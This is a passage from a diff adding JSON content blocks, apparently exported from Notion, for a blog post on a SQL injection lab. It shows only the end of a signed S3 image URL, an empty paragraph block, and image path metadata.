azCzUyVVg2w6bhXIbXwEwl%2BacfGPwUOsfQ7Rgoh03suQFfNzVwd8TleUB6H6gbawhtRpkei3rqU%2BMcaX24nKs44sXN6JoueFvaBKmRzBy6fQaObYLB8LCFJf2MWKv16xH1UB3L0VbXlO&X-Amz-Signature=d4a5f7179581f577a404b4a4022781b14d4472e7b3308fbd41fe10e760ed2342&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-807d-85b8-c718103de4b9",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:31:00.000Z",
+        "last_edited_time": "2025-08-27T15:31:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      }
+    ],
+    "og_image": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-1.png",
+    "featured_image": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-1.png"
+  }
+}
